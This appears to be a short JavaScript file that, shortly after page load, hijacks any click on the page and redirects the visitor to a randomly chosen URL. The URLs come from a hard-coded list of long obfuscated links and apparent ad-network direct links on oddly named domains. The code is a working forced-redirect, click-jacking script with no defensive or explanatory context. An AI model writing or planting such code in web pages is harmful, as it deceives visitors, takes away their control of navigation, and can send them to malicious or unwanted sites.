function init() {
  var arr = [
    // hil: db
    "https://grim-package.com/br3vVW0.P/3YpmvdbHmnV/JXZMDZ0l1-MVTek/5pM/zigkydLUTyUixOOFThk/zDO_DxMw",
    "https://grim-package.com/b/3BV.0DPA3kpYvmb/mGV-JaZiDz0r1RMcjdUHyJNQj/Uq2xLdTnU/ylNFTtIJ2_NWTXce",
    "https://grim-package.com/bg3tV.0SPx3fpjv/bOmuVmJuZ/Dh0L1/MgT/ke5mNTDAAjwYL-TYU/xJO/TLkx0hMRDmEo",
    "https://grim-package.com/bi3fVk0.Ph3DpmvObumCV/J/ZFDU0m1KMvTDky5ONYDpAg4dL/TAU-xPOdTpkX0mMvDmkU",
    "https://grim-package.com/bS3fVD0/P.3Npjv/bDmSV/JPZrDZ0V1lMQzVEN0/OdTIUL5/LjTbUfzTMATIQF5/N_juAn",

    "https://grim-package.com/b/3.V/0dPL3DpCvSbbm-VXJ/ZVD/0N1nMNzcMfxmNVj/EuzXLVT/UozwMdzQEH2NM/T/QR",
    "https://grim-package.com/bc3.Vx0/PM3/pFvwbImsVrJbZfDQ0/1pM/znM/zUM/TaMb1KLMTZUPztMJzqM/x_Mlz/YW",
    "https://grim-package.com/bT3gV.0PPw3hpjvxb/msVBJ/ZODq0e1bMNzWco5yMxjZUM2/LCTGUHzJN-z/k/yAN/Tccg",
    "https://grim-package.com/br3LVA0.P/3_pGvobvmuV/JkZBD/0U1PM/zMcQ5qMsj/Yy0ELBTwUVzmNHzFkTyhN-jkUd",
    "https://grim-package.com/bM3/Va0.PD3Gpuvmb/m/V-JbZ/DZ0y1NM/z/c_5WMEjmcby/LjTlUIzjN-zPkey/NrzNMF",
    
    // mon: db
    "https://thelrourg.net/4/7237942",
    "https://woafoame.net/4/7237941",
    "https://corgouzaptax.com/4/7474716",
    "https://eeptoabs.com/4/7420689",
    "https://thechoansa.com/4/7237907",

    "https://psomtenga.net/4/7420696",
    "https://kaushooptawo.net/4/7237921",
    "https://vekseptaufin.com/4/7420698",
    "https://thomtubsaro.com/4/7436813",
    "https://grushoungy.com/4/7614690",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 5000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);